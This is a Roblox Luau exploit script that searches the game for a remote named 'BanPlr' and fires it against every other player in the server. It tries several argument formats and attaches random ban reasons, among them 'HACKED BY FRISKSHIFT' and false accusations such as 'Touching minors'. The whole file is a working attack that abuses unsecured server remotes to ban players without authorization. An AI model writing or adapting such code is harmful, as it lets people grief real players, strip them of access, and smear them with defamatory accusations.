local banName = "BanPlr"
local aMethod = 1
local isFunction = false

function getType(istan:Instance, type_name:string, name:string):table
    local type_tbl = {}
    for _, even in istan:GetDescendants() do
        if even:IsA(type_name) then
            if name == nil then
                table.insert(type_tbl, even)
            elseif even.Name == name then
                table.insert(type_tbl, even)
            end
        end
    end
    return type_tbl
end

local PS = game:GetService("Players")
local reasons = {"Scamming", "Farting Owner", "Exploitng", "Bypassing Chat", "Harassment", "Bullying someone", "Inappropriate Avator / Name", "Touching minors", "HACKED BY FRISKSHIFT", "FRISKSHIFT IS BACK"}

local function parseArgs(p, reason)
    local bantable = {}
    if aMethod == 1 then
        bantable = {{p, p, reason}}
    elseif aMethod == 2 then
        bantable = {{p.UserId, p.UserId, reason}}
    elseif aMethod == 3 then
        bantable = {{p.Name, p.Name, reason}}
    elseif aMethod == 4 then
        bantable = {p.UserId, reason, '', '', ''}
    elseif aMethod == 5 then
        bantable = {p.Name, reason, '', '', ''}
    else
        bantable = {p, reason, '', '', ''}
    end
    return bantable
end
local function doRemote(tbl:table)
    local retval = nil
    for _, remote in pairs(getType(game, isFunction and "RemoteFunction" or "RemoteEvent", banName)) do
        if isFunction then
            retval = remote:InvokeServer(unpack(tbl))
        else
            retval = remote:FireServer(unpack(tbl))
        end
    end
    return retval
end

for _, p in PS:GetPlayers() do
    if p == PS.LocalPlayer then continue end
    local foundval = doRemote(parseArgs(p, reasons[math.random(0, #reasons)]))
    if foundval ~= nil then print("Returned Remote: " .. foundval) end
end